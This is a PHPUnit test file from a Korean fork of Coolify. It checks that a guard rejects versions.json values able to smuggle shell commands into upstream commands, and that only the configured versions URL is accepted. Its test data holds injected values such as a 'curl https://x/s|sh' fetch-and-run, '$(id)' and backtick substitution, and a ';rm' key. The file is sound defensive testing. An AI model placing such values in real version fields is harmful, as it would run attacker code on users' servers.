<?php

declare(strict_types=1);

namespace CoolifyKo\Codemod\Tests\Unit\Overlay;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * 보안 점검(2026-10-22) 높음 1건: 상류 Coolify는 VERSIONS_URL의 helper·sentinel·v4 버전을 이스케이프 없이 셸 명령에 넣는다.
 * 미러가 뚫려도 사용자 서버에서 명령이 돌지 않게, 이미지 안에서 응답의 버전 값을 검사한다(미러 쪽 검사와 같은 규칙)
 */
final class VersionsGuardTest extends TestCase
{
    public static function setUpBeforeClass(): void
    {
        require_once dirname(__DIR__, 4) . '/overlay/files/bootstrap/helpers/coolify_ko.php';
    }

    /** @return array<string, mixed> 공식 versions.json(2026-10 기준)과 같은 꼴 */
    private static function official(): array
    {
        return [
            'coolify' => [
                'v4' => ['version' => '4.4.6'],
                'nightly' => ['version' => '4.5-rc.1'],
                'helper' => ['version' => '1.0.17'],
                'sentinel' => ['version' => '1.0.2'],
                'sentinel-host' => ['version' => '1.0.2', 'digest' => 'sha256:ef4a41f2dfaf20c91c165244508bda12f9b66eb046fd8ae8b575158ccd61262e'],
            ],
            'traefik' => ['v3.7' => '3.7.13', 'v3.6' => '3.6.25', 'v2.11' => '2.11.57'],
        ];
    }

    public function testAcceptsTheOfficialFileAndOurMirrorRecord(): void
    {
        $versions = self::official();
        self::assertSame([], coolify_ko_unsafe_versions($versions));
        $versions['coolify-ko'] = ['schema' => 1, 'upstream' => '4.4.6', 'upstreamSeenAt' => '2026-10-20T06:25:44.587Z', 'refreshedAt' => '2026-10-20T07:02:01.143Z'];
        self::assertSame([], coolify_ko_unsafe_versions($versions));
    }

    /** @return iterable<string, array{0: \Closure(array<string, mixed>): array<string, mixed>}> */
    public static function dirtyFiles(): iterable
    {
        yield 'a shell command in the helper version' => [static function (array $v): array {
            $v['coolify']['helper']['version'] = '9.9.9;curl https://x/s|sh;#';

            return $v;
        }];
        yield 'command substitution in the sentinel version' => [static function (array $v): array {
            $v['coolify']['sentinel']['version'] = '1.0.2$(id)';

            return $v;
        }];
        yield 'a space in the Coolify version' => [static function (array $v): array {
            $v['coolify']['v4']['version'] = '4.4.7 --force';

            return $v;
        }];
        yield 'a malformed sentinel digest' => [static function (array $v): array {
            $v['coolify']['sentinel-host']['digest'] = 'sha256:`id`';

            return $v;
        }];
        yield 'a non-text value' => [static function (array $v): array {
            $v['coolify']['helper']['version'] = ['1.0.17'];

            return $v;
        }];
        // 자동 보안 검토(2026-10-22): PCRE의 $는 끝 줄바꿈 하나를 허용해 셸 명령에 새 줄을 넣을 수 있었다
        yield 'a trailing newline in the helper version' => [static function (array $v): array {
            $v['coolify']['helper']['version'] = "1.0.17\n";

            return $v;
        }];
        yield 'a trailing newline in a digest' => [static function (array $v): array {
            $v['coolify']['sentinel-host']['digest'] = 'sha256:' . str_repeat('a', 64) . "\n";

            return $v;
        }];
        yield 'a trailing newline in a key' => [static function (array $v): array {
            $v['traefik']["v3.8\n"] = '3.8.0';

            return $v;
        }];
        yield 'an odd key' => [static function (array $v): array {
            $v['traefik']['v3.7;rm'] = '3.7.13';

            return $v;
        }];
    }

    /** @param \Closure(array<string, mixed>): array<string, mixed> $change */
    #[DataProvider('dirtyFiles')]
    public function testRefusesUnsafeValues(\Closure $change): void
    {
        self::assertNotSame([], coolify_ko_unsafe_versions($change(self::official())));
    }

    public function testRefusesSomethingThatIsNotAVersionsFile(): void
    {
        self::assertSame(['versions'], coolify_ko_unsafe_versions(null));
        self::assertSame(['versions'], coolify_ko_unsafe_versions('4.4.6'));
        self::assertSame(['versions'], coolify_ko_unsafe_versions(['traefik' => []]));
    }

    public function testMatchesOnlyTheConfiguredVersionsUrl(): void
    {
        $url = 'https://coolify-ko.geonwoo.dev/versions.json';
        self::assertTrue(coolify_ko_is_versions_url($url, $url));
        self::assertTrue(coolify_ko_is_versions_url($url . '?check=1', $url));
        self::assertFalse(coolify_ko_is_versions_url('https://coolify-ko.geonwoo.dev/lang/ko.json', $url));
        self::assertFalse(coolify_ko_is_versions_url('https://evil.example/versions.json', $url));
        self::assertFalse(coolify_ko_is_versions_url('http://coolify-ko.geonwoo.dev/versions.json', $url));
        self::assertFalse(coolify_ko_is_versions_url($url, ''));
    }
}
